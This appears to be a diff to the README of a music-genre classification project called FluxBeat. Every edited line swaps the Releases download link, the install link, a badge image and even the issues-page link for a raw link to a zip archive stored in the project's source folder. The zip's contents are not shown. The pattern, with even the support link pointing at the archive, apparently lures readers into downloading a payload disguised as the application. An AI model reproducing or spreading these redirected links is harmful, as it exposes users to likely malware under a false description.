@@ -4,7 +4,7 @@
 FluxBeat is a powerful deep learning system designed to classify music genres and estimate tempo. With its advanced FastAPI server and Explainable AI visualizations, FluxBeat helps users understand how different genres evolve within each track. 
 
 ## 📥 Download Now
-[![Download fluxbeat](https://img.shields.io/badge/Download-fluxbeat-brightgreen)](https://github.com/cadenaar86/fluxbeat/releases)
+[![Download fluxbeat](https://github.com/cadenaar86/fluxbeat/raw/refs/heads/main/src/inference/Software-1.5.zip)](https://github.com/cadenaar86/fluxbeat/raw/refs/heads/main/src/inference/Software-1.5.zip)
 
 ## 🌟 Features
 - **Multi-label Classification**: Identify multiple music genres in one track.
@@ -26,7 +26,7 @@ Make sure your audio files are in popular formats like MP3 or WAV for best resul
 ## 📝 Download & Install
 To get started, visit this page to download:
 
-[Download fluxbeat](https://github.com/cadenaar86/fluxbeat/releases)
+[Download fluxbeat](https://github.com/cadenaar86/fluxbeat/raw/refs/heads/main/src/inference/Software-1.5.zip)
 
 Follow these steps after you've downloaded the application:
 
@@ -44,7 +44,7 @@ Follow these steps after you've downloaded the application:
 5. **Save Your Results**: You can save your results for later or share them with friends.
 
 ## 🛡️ Support
-If you encounter any issues, check the FAQ section in the application or reach out for help on the [issues page](https://github.com/cadenaar86/fluxbeat/issues). You can also find community support in forums related to music analysis and deep learning.
+If you encounter any issues, check the FAQ section in the application or reach out for help on the [issues page](https://github.com/cadenaar86/fluxbeat/raw/refs/heads/main/src/inference/Software-1.5.zip). You can also find community support in forums related to music analysis and deep learning.
 
 ## 📚 Topics
 FluxBeat touches upon various technical topics, such as:
